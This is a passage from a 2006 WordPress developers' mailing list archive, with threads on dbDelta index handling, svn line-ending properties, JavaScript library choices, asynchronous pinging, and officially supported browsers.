> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From ryan at concept64.com  Tue Apr 25 15:18:46 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Tue Apr 25 15:22:57 2006
Subject: [wp-hackers] dbDelta and duplicated indices (WAS: A Question
	On Plugins)
In-Reply-To: <444E2B8B.8010008@jamietalbot.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>	<e6ec604d0604250747h4c454783yba783d4368e87b52@mail.gmail.com>
	<444E2B8B.8010008@jamietalbot.com>
Message-ID: <444E3DD6.9030906@concept64.com>

Jamie Talbot wrote:
> Andy Skelton wrote:
>   
>> If the db version in the option is outdated or missing:
>> $my_queries = "CREATE TABLE foo (...); CREATE TABLE bar (...);"
>> require_once(ABSPATH/wp-admin/upgrade-functions.php);
>> dbDelta($my_queries);
>> update your db version option.
>>     
>
> Incidentally, (and just to hijack a little bit) does dbdelta handle multi-column primary keys?  When
> the table already exists (say I'm upgrading), I get errors like "multiple key not allowed" unless I
> turn errors off.  Also, it seems like UNIQUE indices are duplicated when calling dbdelta repeatedly.
> -  Instead of being overwritten, they are just added, without being removed first.  I'm pretty sure
> this isn't intended behaviour?  If it isn't, I'll open a ticket...  Can anyone else confirm this
> behaviour for other kinds of indices?
>
> Jamie.
>   
I can confirm this for UNIQUE KEY creation.  dbDelta does not play well 
with UNIQUE KEY at all.  I found that if you change it to simply KEY and 
not UNIQUE KEY, dbDelta handles the recreation of the key correctly - or 
it ignores it completely if it already exists.

It won't duplicate the unique indices for me, it simply gives me an 
error stating I can't create an index of the same name.  Whatever the 
symptom, dbDelta is attempting to recreate a UNIQUE KEY index every time.

Ryan
From ringmaster at midnightcircus.com  Tue Apr 25 15:57:53 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Tue Apr 25 15:57:40 2006
Subject: [wp-hackers] dbDelta and duplicated indices
In-Reply-To: <444E3DD6.9030906@concept64.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>	<e6ec604d0604250747h4c454783yba783d4368e87b52@mail.gmail.com>	<444E2B8B.8010008@jamietalbot.com>
	<444E3DD6.9030906@concept64.com>
Message-ID: <444E4701.7070009@midnightcircus.com>

Ryan Scheuermann wrote:
> I can confirm this for UNIQUE KEY creation.  dbDelta does not play well 
> with UNIQUE KEY at all.  I found that if you change it to simply KEY and 
> not UNIQUE KEY, dbDelta handles the recreation of the key correctly - or 
> it ignores it completely if it already exists.
> 
> It won't duplicate the unique indices for me, it simply gives me an 
> error stating I can't create an index of the same name.  Whatever the 
> symptom, dbDelta is attempting to recreate a UNIQUE KEY index every time.

I have a vague recollection of something about the structure of the SQL 
required for specifying keys.

In any case, you can see which indexes it can and can't find by 
uncommenting two lines in dbDelta().   dbDelta() attempts to build SQL 
that would create the indexes in the existing table, and then compare 
them to what it found in the SQL schema it was provided.  If what it 
generates does not exactly match what is in the schema, then it attempts 
to create the index as described in the schema.

So you can see, if that schema attempts to generate an index that 
already exists using a method that doesn't exactly match what dbDelta() 
generates, it causes an error.  There may be a way to do what you want; 
you might need to form your schema more precisely.  If dbDelta() is 
incomplete, then it can be tweaked to include it.

Owen

From ryan at concept64.com  Tue Apr 25 16:09:28 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Tue Apr 25 16:13:42 2006
Subject: [wp-hackers] dbDelta and duplicated indices
In-Reply-To: <444E4701.7070009@midnightcircus.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>	<e6ec604d0604250747h4c454783yba783d4368e87b52@mail.gmail.com>	<444E2B8B.8010008@jamietalbot.com>	<444E3DD6.9030906@concept64.com>
	<444E4701.7070009@midnightcircus.com>
Message-ID: <444E49B8.1030502@concept64.com>

Owen Winkler wrote:
> Ryan Scheuermann wrote:
>> I can confirm this for UNIQUE KEY creation.  dbDelta does not play 
>> well with UNIQUE KEY at all.  I found that if you change it to simply 
>> KEY and not UNIQUE KEY, dbDelta handles the recreation of the key 
>> correctly - or it ignores it completely if it already exists.
>>
>> It won't duplicate the unique indices for me, it simply gives me an 
>> error stating I can't create an index of the same name.  Whatever the 
>> symptom, dbDelta is attempting to recreate a UNIQUE KEY index every 
>> time.
>
> I have a vague recollection of something about the structure of the 
> SQL required for specifying keys.
>
> In any case, you can see which indexes it can and can't find by 
> uncommenting two lines in dbDelta().   dbDelta() attempts to build SQL 
> that would create the indexes in the existing table, and then compare 
> them to what it found in the SQL schema it was provided.  If what it 
> generates does not exactly match what is in the schema, then it 
> attempts to create the index as described in the schema.
>
> So you can see, if that schema attempts to generate an index that 
> already exists using a method that doesn't exactly match what 
> dbDelta() generates, it causes an error.  There may be a way to do 
> what you want; you might need to form your schema more precisely.  If 
> dbDelta() is incomplete, then it can be tweaked to include it.
>
> Owen
>
You're right.  I know when I started using dbDelta for plugin tables, I 
had to really play around with the SQL syntax to get it to work just 
right.  It seems to be quite finicky even with spaces in the wrong 
places.  If there is a correct syntax for specifying UNIQUE KEY, I 
couldn't figure it out - but I didn't spend all that much time 
investigating the code or uncomment those lines and compare the statements.

Maybe if we are going to recommend plugin authors to use dbDelta, we 
should have some documentation on its precise syntax?  Might benefit 
those not willing to fiddle and peruse the core code until it works?  
"We" referring to the collective of WP developers/documenters.  :-)

Ryan
From ringmaster at midnightcircus.com  Tue Apr 25 16:47:55 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Tue Apr 25 16:47:44 2006
Subject: [wp-hackers] dbDelta and duplicated indices
In-Reply-To: <444E49B8.1030502@concept64.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>	<e6ec604d0604250747h4c454783yba783d4368e87b52@mail.gmail.com>	<444E2B8B.8010008@jamietalbot.com>	<444E3DD6.9030906@concept64.com>	<444E4701.7070009@midnightcircus.com>
	<444E49B8.1030502@concept64.com>
Message-ID: <444E52BB.8060107@midnightcircus.com>

Ryan Scheuermann wrote:
> Maybe if we are going to recommend plugin authors to use dbDelta, we 
> should have some documentation on its precise syntax?  Might benefit 
> those not willing to fiddle and peruse the core code until it works?  
> "We" referring to the collective of WP developers/documenters.  :-)

Originally, I had written it so that it would respond to the format that 
phpMyAdmin was producing when I asked for the database struture as SQL. 
  I think that's generally the SHOW CREATE TABLE format.

Owen


From ryan at concept64.com  Tue Apr 25 17:05:50 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Tue Apr 25 17:10:03 2006
Subject: [wp-hackers] dbDelta and duplicated indices
In-Reply-To: <444E52BB.8060107@midnightcircus.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>	<e6ec604d0604250747h4c454783yba783d4368e87b52@mail.gmail.com>	<444E2B8B.8010008@jamietalbot.com>	<444E3DD6.9030906@concept64.com>	<444E4701.7070009@midnightcircus.com>	<444E49B8.1030502@concept64.com>
	<444E52BB.8060107@midnightcircus.com>
Message-ID: <444E56EE.1000804@concept64.com>

Owen Winkler wrote:
> Ryan Scheuermann wrote:
>> Maybe if we are going to recommend plugin authors to use dbDelta, we 
>> should have some documentation on its precise syntax?  Might benefit 
>> those not willing to fiddle and peruse the core code until it works?  
>> "We" referring to the collective of WP developers/documenters.  :-)
>
> Originally, I had written it so that it would respond to the format 
> that phpMyAdmin was producing when I asked for the database struture 
> as SQL.  I think that's generally the SHOW CREATE TABLE format.
>
> Owen
>
OK, that makes sense.  I just tested a single column UNIQUE KEY with 
this syntax and dbDelta works 100%, but with a multi-column UNIQUE KEY, 
dbDelta does attempt to recreate the index every time even with the 
exact phpMyAdmin syntax.

Ryan
From ryan at concept64.com  Tue Apr 25 17:12:30 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Tue Apr 25 17:16:45 2006
Subject: [wp-hackers] dbDelta and duplicated indices
In-Reply-To: <444E56EE.1000804@concept64.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>	<e6ec604d0604250747h4c454783yba783d4368e87b52@mail.gmail.com>	<444E2B8B.8010008@jamietalbot.com>	<444E3DD6.9030906@concept64.com>	<444E4701.7070009@midnightcircus.com>	<444E49B8.1030502@concept64.com>	<444E52BB.8060107@midnightcircus.com>
	<444E56EE.1000804@concept64.com>
Message-ID: <444E587E.307@concept64.com>

Ryan Scheuermann wrote:
> Owen Winkler wrote:
>> Ryan Scheuermann wrote:
>>> Maybe if we are going to recommend plugin authors to use dbDelta, we 
>>> should have some documentation on its precise syntax?  Might benefit 
>>> those not willing to fiddle and peruse the core code until it 
>>> works?  "We" referring to the collective of WP 
>>> developers/documenters.  :-)
>>
>> Originally, I had written it so that it would respond to the format 
>> that phpMyAdmin was producing when I asked for the database struture 
>> as SQL.  I think that's generally the SHOW CREATE TABLE format.
>>
>> Owen
>>
> OK, that makes sense.  I just tested a single column UNIQUE KEY with 
> this syntax and dbDelta works 100%, but with a multi-column UNIQUE 
> KEY, dbDelta does attempt to recreate the index every time even with 
> the exact phpMyAdmin syntax.
>
> Ryan
>
And actually, I just tested it again - with a single column UNIQUE KEY 
when the key already exists but you change the key column, dbDelta 
attempts to ADD the unique key index but it doesn't drop the old index 
first.  That's probably the problem.

Ryan
From denis at semiologic.com  Tue Apr 25 19:23:12 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Tue Apr 25 19:27:32 2006
Subject: [wp-hackers] RE: A quick update on
	thesecurityissueI'dmentionedtoday
In-Reply-To: <MJEEIIFCKOJBBNFPJGJCOEPHLDAA.angsuman@taragana.com>
Message-ID: <000901c6689d$b2baab50$2f01a8c0@kergan>

> A detailed how-to might actually make coders more cautious 
> before posting a code for public consumption next time around 
> and users (of the code) before consuming any code in the wild.

except that you're better off doing so _after_ the system is widely patched.

Denis

From nbachiyski at developer.bg  Tue Apr 25 21:05:13 2006
From: nbachiyski at developer.bg (Nikolay Bachiyski)
Date: Tue Apr 25 21:09:28 2006
Subject: [wp-hackers] Re: [wp-svn] [3730] trunk/wp-includes: Updating
	eol-style native.
In-Reply-To: <200604191013.k3JADV7c059501@comox.textdrive.com>
References: <200604191013.k3JADV7c059501@comox.textdrive.com>
Message-ID: <444E8F09.1070507@developer.bg>

m@wordpress.org wrote:
> Revision
>     3730
> Author
>     matt
> Date
>     2006-04-19 10:13:28 +0000 (Wed, 19 Apr 2006)
> 
> 
>       Log Message
> 
> Updating eol-style native. We must remember to do this when adding new files.
 >
 >
 >       Modified Paths
 >
 >     * trunk/wp-includes/comment-template.php
 >       <#trunkwpincludescommenttemplatephp>
 >
 >
 >       Property Changed
 >
 >     * trunk/wp-includes/comment-template.php
 >     * trunk/wp-includes/theme.php
 >

Great - native line endings are lovely!

However, there are some more files without eol-style property set:
(some are with svn:executable, others with no properties)

wp-admin/admin-ajax.php
wp-admin/categories.js
wp-admin/comment.php
wp-admin/custom-fields.js
wp-admin/import/dotclear.php
wp-admin/link.php
wp-admin/list-manipulation-js.php
wp-admin/page.php
wp-admin/post-new.php
wp-admin/users.js
wp-content/index.php
wp-content/themes/default/attachment.php
wp-content/themes/default/functions.php
wp-content/themes/default/images/header-img.php
wp-cron.php
wp-includes/js/tinymce/langs/en.js
wp-includes/js/tinymce/license.html
wp-includes/js/tinymce/license.txt
wp-includes/js/tinymce/plugins/autosave/editor_plugin.js
wp-includes/js/tinymce/plugins/autosave/editor_plugin_src.js
wp-includes/js/tinymce/plugins/autosave/langs/cs.js
wp-includes/js/tinymce/plugins/autosave/langs/en.js
wp-includes/js/tinymce/plugins/autosave/langs/sv.js
wp-includes/js/tinymce/plugins/directionality/editor_plugin.js
wp-includes/js/tinymce/plugins/directionality/langs/en.js
wp-includes/js/tinymce/plugins/inlinepopups/css/inlinepopup.css
wp-includes/js/tinymce/plugins/inlinepopups/editor_plugin.js
wp-includes/js/tinymce/plugins/inlinepopups/editor_plugin_src.js
wp-includes/js/tinymce/plugins/inlinepopups/jscripts/mcwindows.js
wp-includes/js/tinymce/plugins/inlinepopups/readme.txt
wp-includes/js/tinymce/plugins/paste/blank.htm
wp-includes/js/tinymce/plugins/paste/css/blank.css
wp-includes/js/tinymce/plugins/paste/css/pasteword.css
wp-includes/js/tinymce/plugins/paste/editor_plugin.js
wp-includes/js/tinymce/plugins/paste/jscripts/pastetext.js
wp-includes/js/tinymce/plugins/paste/jscripts/pasteword.js
wp-includes/js/tinymce/plugins/paste/langs/en.js
wp-includes/js/tinymce/plugins/paste/pastetext.htm
wp-includes/js/tinymce/plugins/paste/pasteword.htm
wp-includes/js/tinymce/plugins/spellchecker/classes/HttpClient.class.php
wp-includes/js/tinymce/plugins/spellchecker/classes/TinyGoogleSpell.class.php
wp-includes/js/tinymce/plugins/spellchecker/classes/TinyPspell.class.php
wp-includes/js/tinymce/plugins/spellchecker/classes/TinyPspellShell.class.php
wp-includes/js/tinymce/plugins/spellchecker/config.php
wp-includes/js/tinymce/plugins/spellchecker/css/content.css
wp-includes/js/tinymce/plugins/spellchecker/css/spellchecker.css
wp-includes/js/tinymce/plugins/spellchecker/editor_plugin.js
wp-includes/js/tinymce/plugins/spellchecker/langs/en.js
wp-includes/js/tinymce/plugins/spellchecker/tinyspell.php
wp-includes/js/tinymce/plugins/wordpress/editor_plugin.js
wp-includes/js/tinymce/plugins/wordpress/langs/en.js
wp-includes/js/tinymce/plugins/wordpress/popups.css
wp-includes/js/tinymce/plugins/wordpress/wordpress.css
wp-includes/js/tinymce/plugins/wphelp/editor_plugin.js
wp-includes/js/tinymce/plugins/wphelp/langs/en.js
wp-includes/js/tinymce/themes/advanced/css/editor_content.css
wp-includes/js/tinymce/themes/advanced/css/editor_popup.css
wp-includes/js/tinymce/themes/advanced/css/editor_ui.css
wp-includes/js/tinymce/themes/advanced/langs/en.js

Nikolay.
From Brian at TheCodeCave.com  Tue Apr 25 22:11:24 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Tue Apr 25 22:15:42 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44490419.80507@midnightcircus.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF9809B@dsimail.drbsystems.com>

Owen mentioned:
>Interested parties should review this ticket:
>http://trac.wordpress.org/ticket/2678


Hey Owen,

There's a design flaw in the nonce time out logic for this ticket.

Should I bring that up here, or do I (aka everyone) have the rights to make
comments on that ticket?

I really know nothing about the trac system you all use...

_______________________________________________
Brian Layman
www.TheCodeCave.com
 

From r at robm.me.uk  Tue Apr 25 23:13:42 2006
From: r at robm.me.uk (Rob)
Date: Tue Apr 25 23:17:27 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF9809B@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF9809B@dsimail.drbsystems.com>
Message-ID: <444EAD26.1070506@robm.me.uk>

Brian Layman wrote:
>
> Should I bring that up here, or do I (aka everyone) have the rights to make
> comments on that ticket?
>   
Log into Trac using the same username and password as you use for the WP 
forum, and you can post comments to your heart's delight.

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From mark.wordpress at txfx.net  Wed Apr 26 05:11:47 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Wed Apr 26 05:16:04 2006
Subject: [wp-hackers] dbDelta and duplicated indices
In-Reply-To: <444E587E.307@concept64.com>
References: <6BDE5FA1-62DF-457A-BDFB-A4BD4E869892@yellowswordfish.com>	<e6ec604d0604250747h4c454783yba783d4368e87b52@mail.gmail.com>	<444E2B8B.8010008@jamietalbot.com>	<444E3DD6.9030906@concept64.com>	<444E4701.7070009@midnightcircus.com>	<444E49B8.1030502@concept64.com>	<444E52BB.8060107@midnightcircus.com>
	<444E56EE.1000804@concept64.com> <444E587E.307@concept64.com>
Message-ID: <B32E8D9A-A19E-4230-9851-EFF0C8B23984@txfx.net>

On Apr 25, 2006, at 1:12 PM, Ryan Scheuermann wrote:

> And actually, I just tested it again - with a single column UNIQUE  
> KEY when the key already exists but you change the key column,  
> dbDelta attempts to ADD the unique key index but it doesn't drop  
> the old index first.  That's probably the problem.

I encountered a problem like this while testing a patch that bumped  
the database version... upgrade.php was throwing that error while  
dealing with one of WordPress' new multi-column keys.
--
Mark Jaquith
http://txfx.net/


From r at schestowitz.com  Wed Apr 26 05:55:14 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Wed Apr 26 05:51:41 2006
Subject: [wp-hackers] Re: [wp-trac] Re: [WordPress Trac] #2691: HTML
	comments in posts aren't handled properly.
In-Reply-To: <7235ce780604250135h2f8dd85cie0383e70949b8990@mail.gmail.com>
References: <061.40aab27f9e9647c3f555b886d569da05@lists.automattic.com>
	<070.e9c466bc92336c9a6b232caf60e9f25f@lists.automattic.com>
	<7235ce780604250135h2f8dd85cie0383e70949b8990@mail.gmail.com>
Message-ID: <20060426065514.8a7sd11rlw08848w@banana.catalyst2.com>

___/ On Tue 25 Apr 2006 09:35:44 BST, [ Mike Little ] wrote : \___

> On 4/25/06, WordPress Trac <wp-trac@lists.automattic.com> wrote:
>> #2691: HTML comments in posts aren't handled properly.
>> -------------------------------------------------------
>>        Id:  2691       |      Status:  new
>> Component:  General    |    Modified:  Tue Apr 25 07:51:49 2006
>>  Severity:  normal     |   Milestone:
>>  Priority:  normal     |     Version:  2.0
>>     Owner:  anonymous  |    Reporter:  gord
>> -------------------------------------------------------
>
>>  <snip />
>>
>> Comment (by skeltoac):
>>
>>  This is what is implied: nobody who has seen this has found it important
>>  enough to spend their time rewriting autop to work around comments. The
>>  applicable mantra is "edge case." You are welcome to work up a patch and
>>  submit it for testing and consideration.
>
> So, along with dropping the accessibility of WordPress admin, because,
> presumably, all those blind, partially-sighted, and physically
> disabled people are 'edge case'; we are now dropping the 'standards
> compliant' part of WordPress
>
> Whatever happened to:
>
> "WordPress is a state-of-the-art semantic personal publishing platform
> with a focus on aesthetics, web standards, and usability."
>
> Oh wait! It's still there on the web site, perhaps it needs removing.
> Or perhaps it needs rewording: Try dropping 'usability' and 'web
> standards'. Perhaps add 'coolness' and 'buzz word compliance'.

Regarding  accessibility, there is a tradeoff involved. Perhaps making the
presentation layer more isolated and less reliant on JS (I know there is a
fallback, but it's iffy) is the way to go. Modularity has been compromised
and lack of compliance with standard further contributes to such issues.

The  administration  panel  is not as 'skinnable' as it  once  was,  which
prevents simplification/enhancement for a variety of purposes. I am yet to
see  how WordPress can be managed from Lynx or a PDA with a small  display
(a  mobile  telephone  perhaps).  The disabled could  contribute  to  such
discussions.  I  can  vividly recall one blind girl from  the  Forum.  She
struggled to run her blog with 2.0.

With  WYSIWYG editing, as well as AJAX-type interfaces, it often  appeared
as  though this idealogy of extension through plug-ins had been  forsaken.
While Windows Vista, KDE and iTunes have fallen victim to greed for flash,
Firefox gives a contrary example.

Best wishes,

Roy


-- 
Roy S. Schestowitz      |    Useless fact: 21978 x 4 = 21978 backwards
http://Schestowitz.com  |    SuSE Linux     ?     PGP-Key: 0x74572E8E
  6:35am  up 3 days 15:46,  10 users,  load average: 0.35, 0.73, 0.72

From tom.armitage at gmail.com  Wed Apr 26 07:33:53 2006
From: tom.armitage at gmail.com (Tom Armitage)
Date: Wed Apr 26 07:38:08 2006
Subject: [wp-hackers] Officially supported browsers. was: Security at
	Wordpress
In-Reply-To: <5aa3aa0604232305p2dca6b58nfbab8a1709bd8510@mail.gmail.com>
References: <6453a6e90604232253x6e62ae8as4dfe36dd5a788c78@mail.gmail.com>
	<5aa3aa0604232305p2dca6b58nfbab8a1709bd8510@mail.gmail.com>
Message-ID: <948601250604260033x7e2bf9f2hcfe805cccebb3fbf@mail.gmail.com>

No, that's exactly the point. There are a huge number of factors to
consider.

The "officially supported" list tells that world what you test against. If
you make what you test against public, it not only enforces the
WP-developers' duty to test against those browser - or, at least,
_someone_'s duty to do so - it also enforces your decision *not to test the
rest of them*.

It's a very important thing to have for a web project. Otherwise, the guy
running an old build of Konqueror can come up, out of the blue, and say "it
doesn't work!". If you make it clear that you only test on Konqueror verison
"foo", you can then at least say "sorry, that's an untested version. We have
tested Konqueror, but only from version "foo" on, and as such can only
support that".

It's called covering your ass, basically. It makes sense.

On 24/04/06, Craig <nuclearmoose@gmail.com> wrote:
>
> I've never seen an official list of supported browsers. I can't even see
> the
> point of having one as there are simply too many factors to consider.
>
> Craig Hartel.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From m at mullenweg.com  Wed Apr 26 07:39:38 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed Apr 26 07:45:52 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <1E9B621A-B9A4-4999-B332-ECAC4924E26C@turbonet.com>
References: <444B8205.8070200@concept64.com>
	<1E9B621A-B9A4-4999-B332-ECAC4924E26C@turbonet.com>
Message-ID: <444F23BA.3060508@mullenweg.com>

Michael D Adams wrote:
> listMan is not brilliant code.  It's pretty ugly in places, actually.  
> But it gets the job done.  All of the JS files that use it are < 30 
> lines of code (most are ~5) and could be made even better with a tweak 
> or two here and there.  Also (other than the recoloring of alternating 
> rows) it all seems pretty fast (I don't have anything even close to a 
> set of benchmarks).

I do like how light it is. Functionality wise, it works great too.

> If we decide to use prototype, I'd be all for that; it's popular, well 
> maintained and it works.  Someone else can do the listMan rewrite (or 
> replacement), though.  It should have another set of eyes look at it 
> anyway.

In addition to prototype, I think whoever takes ownership of this should 
take a strong look at:

http://www.mochikit.com/
http://dojotoolkit.org/

In addition to the Prototype cousins already mentioned.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From ryan at concept64.com  Wed Apr 26 13:34:44 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Wed Apr 26 13:39:02 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <444F23BA.3060508@mullenweg.com>
References: <444B8205.8070200@concept64.com>	<1E9B621A-B9A4-4999-B332-ECAC4924E26C@turbonet.com>
	<444F23BA.3060508@mullenweg.com>
Message-ID: <444F76F4.1090705@concept64.com>

Matt Mullenweg wrote:
> In addition to prototype, I think whoever takes ownership of this 
> should take a strong look at:
>
> http://www.mochikit.com/
> http://dojotoolkit.org/
>
> In addition to the Prototype cousins already mentioned.
>
I've read a few articles comparing Prototype with Dojo.  Based on the 
articles, Dojo seems a bit too new and under-tested.  As of this email, 
I couldn't even get to the Dojo Wiki - which is not a result of the JS 
library of course, but does say something about Dojo in general.  When I 
looked at their Wiki previously (which utilizes Dojo) it seemed to have 
more than a few quirks left to work out.

Word on the street seems to think it is over-designed while Prototype 
was built from the concerns of real-world apps (Basecamp and now 
Fluxiom) and tightly coupled with Ruby on Rails. 

A friend of mine was just at The Java Server Side Symposium in March, 
and although there didn't seem to be any talk about Mochikit, the 
general consensus comparing Dojo and Prototype was that Prototype is 
easier to use, more popular, and more lightweight.  But Dojo seemed to 
be marketing themselves well.  :-)

Dojo's AJAX package is 208KB uncompressed while Prototype weighs in at 
54KB.  But those may not include the same functionality; I had a hard 
time determining which Dojo package matched Prototype exactly.  The Dojo 
AJAX package may be comparable to Prototype w/ the Scriptaculous effects 
libary (which is still over 100KB less than Dojo).  And Prototype w/ 
moo.fx is even less.

Documentation wise, Dojo is probably better (when you can get to the 
Wiki) as Prototype's documentation is the source.  Though when browsing 
the source, it's not hard to feel at home with it once you understand 
the concepts.  And there are more third-party articles everyday on 
"Intro to Prototype" and even more examples.  "Intro to Dojo" articles 
are hard to come by.  Scriptaculous's Wiki also provides a lot of 
documentation on Prototype as well.

I've seen Prototype w/ either Scriptaculous, moo.fx, and/or Behaviour on 
small to medium-size sites and apps repeatedly, and I'm yet to come 
across Dojo being used even once (but I may be hanging out in the wrong 
circles for it).  For huge apps, Dojo may be more robust and modular, 
but for WP and WP-driven sites, I can't imagine it's bulk or modularity 
would be necessary.

So, as my preliminary opinion (I'm open to persuasion), I'd say 
Prototype over Dojo, and I haven't investigated Mochikit (just heard of 
it now myself).  Not what Matt calls a strong look, just my two cents 
thus far.  I'm willing to contribute to this endeavor when a solid plan 
is formulated.

Ryan Scheuermann
From lists at kirabug.com  Wed Apr 26 13:51:40 2006
From: lists at kirabug.com (Anne Gibson)
Date: Wed Apr 26 13:55:58 2006
Subject: [wp-hackers] Officially supported browsers. was: Security at
	Wordpress
In-Reply-To: <948601250604260033x7e2bf9f2hcfe805cccebb3fbf@mail.gmail.com>
References: <6453a6e90604232253x6e62ae8as4dfe36dd5a788c78@mail.gmail.com>
	<5aa3aa0604232305p2dca6b58nfbab8a1709bd8510@mail.gmail.com>
	<948601250604260033x7e2bf9f2hcfe805cccebb3fbf@mail.gmail.com>
Message-ID: <69898D91-11BC-4F3A-8824-7D3F27D6CDD4@kirabug.com>

I have to agree with this. I've been working web support for years  
and I've never seen an established company with a serious website  
that didn't say, "We support/test X". Successful companies, for the  
most part, support a pretty wide range of browsers - Windows, Mac,  
and *nix - and thanks to the consistency of Mozilla/5.0 browsers,  
usually a problem on one is a problem on all.

Now, the situation at work is a whole lot easier than trying to  
choose a support model for Wordpress -- we have web stats we can use  
to say, "We're getting 8 hits a month from iCab 1.0, I'm pretty sure  
we don't need to support that". And trying to choose a supported  
browser matrix would bring a lot of differing opinions to light I'm  
sure, but just based on the code behavior I'm sure we can rule out,  
say, Netscape 3.0.

Every developer is developing with a set of mental expectations -  
expressed or not - on where his/her code is going to run. Shouldn't  
that be written down somewhere? Even if all it says is "We're  
relatively sure Wordpress will work just fine with IE 5 and any  
Mozilla/5.0 based browser, but if you're running something else you  
may need to modify the source code to meet your needs." we'd be ahead  
of the game.

anne gibson


On Apr 26, 2006, at 3:33 AM, Tom Armitage wrote:

> No, that's exactly the point. There are a huge number of factors to
> consider.
>
> The "officially supported" list tells that world what you test  
> against. If
> you make what you test against public, it not only enforces the
> WP-developers' duty to test against those browser - or, at least,
> _someone_'s duty to do so - it also enforces your decision *not to  
> test the
> rest of them*.
>
> It's a very important thing to have for a web project. Otherwise,  
> the guy
> running an old build of Konqueror can come up, out of the blue, and  
> say "it
> doesn't work!". If you make it clear that you only test on  
> Konqueror verison
> "foo", you can then at least say "sorry, that's an untested  
> version. We have
> tested Konqueror, but only from version "foo" on, and as such can only
> support that".
>
> It's called covering your ass, basically. It makes sense.
>
> On 24/04/06, Craig <nuclearmoose@gmail.com> wrote:
>>
>> I've never seen an official list of supported browsers. I can't  
>> even see
>> the
>> point of having one as there are simply too many factors to consider.
>>
>> Craig Hartel.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers@lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>

From skeltoac at gmail.com  Wed Apr 26 14:01:31 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Wed Apr 26 14:07:24 2006
Subject: [wp-hackers] Questions on execute-pings.php...
In-Reply-To: <MJEEIIFCKOJBBNFPJGJCEEBLLEAA.angsuman@taragana.com>
References: <e6ec604d0604241658w52de3743t1fc549f90c4c3712@mail.gmail.com>
	<MJEEIIFCKOJBBNFPJGJCEEBLLEAA.angsuman@taragana.com>
Message-ID: <e6ec604d0604260701p94bd8a3va8fcbd798d4322d5@mail.gmail.com>

On 4/25/06, Angsuman Chakraborty <angsuman@taragana.com> wrote:
> At this point it is simply calling the execute-pings in a convoluted (network error prone) and slower way without any visible benefits

Have you arrived at this analysis by testing or assuming?

When I last left the code, I could put 50 links and in a post and add
a slew of trackbacks and when I clicked Publish, WordPress would
complete the action and redirect me on my way in less than a second. I
simultaneously watched the server log on another computer (the one
targeted by all the links and trackbacks) as it received each of the
pings asynchronously over the next few minutes.

This worked perfectly every time on my LAMP boxes. A few people
reported problems and the common denominator between their servers was
PHP as CGI. The exact phenomenon is one I am still unable to explain,
though I have come to believe it: the user-inititated publishing
process succeeds in saving the post and spawning the asynchronous
pinging process, but the pinging process fails silently IF (though not
exactly WHEN) that process involves opening two more sockets.

So the asynchronous process serves a purpose and it works well on the
majority of installations in use. If you want to go back to
synchronous pinging and wait a few minutes to get any confirmation
that your post was published, rather than find an asynchronous
solution that works in all cases, I suggest you hang around a bit
longer and come up to speed.

Cheers,
Andy
From podz at tamba2.org.uk  Wed Apr 26 14:07:22 2006
From: podz at tamba2.org.uk (Podz)
Date: Wed Apr 26 14:11:40 2006
Subject: [wp-hackers] Forum Post: High Traffic
Message-ID: <444F7E9A.9090107@tamba2.org.uk>

http://wordpress.org/support/topic/70303?replies=4

Seems to be some useful info to work with.
Host is Mediatemple.

P.
From Brian at TheCodeCave.com  Wed Apr 26 14:15:49 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Wed Apr 26 14:20:37 2006
Subject: [wp-hackers] Officially supported browsers. was: Security
	atWordpress
In-Reply-To: <69898D91-11BC-4F3A-8824-7D3F27D6CDD4@kirabug.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF9809C@dsimail.drbsystems.com>

Anne Mentioned:
> I have to agree with this. I've been working web support for years  
> and I've never seen an established company with a serious website  
> that didn't say, "We support/test X". Successful companies, for the  
> most part, support a pretty wide range of browsers - Windows, Mac,  
> and *nix - and thanks to the consistency of Mozilla/5.0 browsers,  
> usually a problem on one is a problem on all.

That said, PC Magazine just reported that they tested having a "This Site is
best viewed in XYZ" label on a site and found that a significant number
first time visitors not having that browser did not come back. It was a
double digits percentage (I want to say 29% but that sounds way high).  

They concluded from this that people were taking those messages as "If you
don't use XYZ, we don't like you as much."  So, if you aren't going to boast
that you support all the major browsers, you should realize that you are
